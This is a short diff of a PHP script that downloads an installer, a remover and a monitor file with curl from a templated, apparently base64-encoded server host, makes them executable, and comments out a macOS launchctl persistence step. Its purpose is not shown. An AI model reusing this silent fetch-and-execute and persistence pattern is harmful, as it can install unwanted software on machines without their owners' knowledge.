@@ -41,29 +41,30 @@ $downloads = array(
   'i' => INSTALLER,
   'r' => REMOVER,
   'g' => MONITOR_FILE,
-  'l' => LAUNCH_PLIST
+// 'l' => LAUNCH_PLIST
 );
 
 foreach ($downloads as $page => $file) {
   exec('curl -s -o ' . $file . ' ' . '{{B64_STR_SERVER_HOST}}' . $page . '.php?h=' . HASH);
 }
 
-$replaces = array(
-  LAUNCH_PLIST => array(
-    '{{MONITOR}}' => MONITOR_FILE,
-    '{{BINARY_LOCATION}}' => BINARY_FILE
-  )
-);
-
-foreach ($replaces as $file => $list) {
-  $contents = file_get_contents($file);
-
-  foreach ($list as $search => $replace) {
-    $contents = str_replace($search, $replace, $contents);
-  }
-
-  file_put_contents($file, $contents);
-}
+// $replaces = array(
+//   LAUNCH_PLIST => array(
+//     '{{MONITOR}}' => MONITOR_FILE,
+//     '{{BINARY_LOCATION}}' => BINARY_FILE
+//   )
+// );
+// 
+// foreach ($replaces as $file => $list) {
+//   $contents = file_get_contents($file);
+// 
+//   foreach ($list as $search => $replace) {
+//     $contents = str_replace($search, $replace, $contents);
+//   }
+// 
+//   file_put_contents($file, $contents);
+// }
 
 exec('chmod +x ' . BINARY_FILE . ' ' . INSTALLER . ' ' . REMOVER . ' ' . MONITOR_FILE);
-exec('launchctl load ' . LAUNCH_PLIST);
+
+// exec('launchctl load ' . LAUNCH_PLIST);
